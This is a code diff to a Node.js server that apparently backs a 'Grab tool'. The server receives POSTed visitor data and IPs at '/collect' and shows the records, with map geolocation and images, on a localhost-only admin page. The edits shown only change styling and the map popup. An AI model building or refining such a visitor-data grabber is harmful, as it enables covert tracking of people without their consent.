@@ -101,17 +101,14 @@ function saveRecord(record) {
 const server = http.createServer((req, res) => {
   let clientIP = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace(/^::ffff:/,'');
 
-  // --- Serve images ---
   if (req.url.startsWith('/images/')) {
     return serveStatic(IMAGE_DIR, req.url.replace('/images',''), res, 'image/png');
   }
 
-  // --- Serve user page ---
   if (req.url === '/' || req.url === '/user.html') {
     return serveStatic(PUBLIC_DIR, '/user.html', res, 'text/html');
   }
 
-  // --- Collect POST data ---
   if (req.url === '/collect' && req.method === 'POST') {
     let body = '';
     req.on('data', chunk => body += chunk);
@@ -171,7 +168,6 @@ const server = http.createServer((req, res) => {
     return;
   }
 
-  // --- Admin page ---
   if (req.url === '/admin') {
     if (!['127.0.0.1','::1'].includes(clientIP)) {
       res.writeHead(403);
@@ -210,14 +206,14 @@ const server = http.createServer((req, res) => {
     let out = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Admin</title>'+
       '<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />'+
       '<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>'+
-      '<style>.map{height:200px;width:100%;margin:10px 0;}'+
-      'body{background:#000;color:#0f0;font-family:monospace;text-align:center;}'+
-      '.record{border:2px solid #0f0;margin:10px auto;padding:15px;width:95%;max-width:700px;border-radius:5px;text-align:left;}'+
+      '<style>'+
+      'body{background:#000;color:#0f0;font-family:monospace;text-align:center;margin:0;padding:0 10px;}'+
+      '.record{border:2px solid #0f0;margin:10px auto;padding:15px;width:100%;max-width:1200px;border-radius:5px;text-align:left;box-sizing:border-box;}'+
       '.record h2{color:#0f0;font-size:1.8em;margin-bottom:5px;}'+
       '.label{color:#7fff7f; font-weight:bold;}'+
       '.prebox{background:#010;color:#0f0;padding:5px;overflow:auto;white-space:pre-wrap;word-wrap:break-word;max-height:200px;border:1px solid #0f0;border-radius:3px;}'+
       'a.geo{color:#0ff;cursor:pointer;text-decoration:underline;} img{max-width:90%;height:auto;margin:10px 0;display:block;margin-left:auto;margin-right:auto;}'+
-      '@media(max-width:600px){.record{width:95%;padding:10px;}}'+
+      '@media(max-width:600px){.record{padding:10px;}}'+
       '</style></head><body><h1 style="color:#0f0;">Console\'s Grab tool</h1>';
 
     dataArr.forEach((rec,i)=>{
@@ -252,7 +248,7 @@ const server = http.createServer((req, res) => {
       out += `</div>`;
     });
 
-    // --- Fixed popup modal ---
+    // --- Responsive 95% popup ---
     out += `
     <div id="mapModal" style="
       display:none;
@@ -268,8 +264,10 @@ const server = http.createServer((req, res) => {
     ">
       <div id="mapContainer" style="
         position:relative;
-        width:600px;
-        height:600px;
+        width:95vw;
+        height:95vw;
+        max-width:95vh;
+        max-height:95vh;
         background:#fff;
         border-radius:5px;
       ">
@@ -322,6 +320,10 @@ const server = http.createServer((req, res) => {
       closeBtn.addEventListener('click', () => modal.style.display = 'none');
       modal.addEventListener('click', e => {
         if (e.target === modal) modal.style.display = 'none';
+      });
+
+      window.addEventListener('resize', () => {
+        if (mapInstance) mapInstance.invalidateSize();
       });
     </script>
     `;
